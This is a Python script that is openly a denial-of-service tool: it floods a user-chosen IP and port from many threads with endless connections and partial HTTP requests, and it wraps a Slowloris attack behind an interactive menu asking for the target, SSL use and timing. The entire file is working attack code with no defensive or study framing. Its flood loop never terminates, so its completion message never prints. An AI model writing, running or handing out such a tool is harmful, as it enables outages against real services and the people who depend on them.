import socket
import threading
from slowloris import slowloris_attack

def perform_ddos_attack(target_ip, target_port, num_threads=10):
    def attack():
        while True:
            try:
                with socket.create_connection((target_ip, target_port)) as sock:
                    sock.sendall(b"GET / HTTP/1.1\r\n")
            except Exception as e:
                print(f"Error during DDoS attack: {str(e)}")

    threads = [threading.Thread(target=attack) for _ in range(num_threads)]
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print("\nDDoS attack complete.")

def slowloris_ddos(host, port, num_connections=100, https=False, proxy=False, sleep_time=5):
    if 0.1 <= sleep_time <= 10:
        slowloris_attack(host, port, num_connections, True, https, proxy, None, None, False, sleep_time)
    else:
        print("Invalid sleep time. Please enter a value between 0.1 and 10 seconds.")

def perform_ddos_attack_wrapper():
    print("Choose DDoS method:")
    print("[1] Slowloris")
    print("[2] Normal DDoS")
    method = int(input("Enter method number: "))

    if method == 1:
        target_ip = input("Enter target IP address for Slowloris: ")
        target_port = int(input("Enter target port for Slowloris: "))
        ssl = input("Use SSL? (yes/no): ").lower() == "yes"
        sleep_time = float(input("Enter Slowloris sleep time duration (in seconds): "))
        slowloris_ddos(target_ip, target_port, 100, ssl, True, sleep_time)
    elif method == 2:
        target_ip = input("Enter target IP address for Normal DDoS: ")
        target_port = int(input("Enter target port for Normal DDoS: "))
        perform_ddos_attack(target_ip, target_port, 100)

# Example Usage:
# perform_ddos_attack_wrapper()
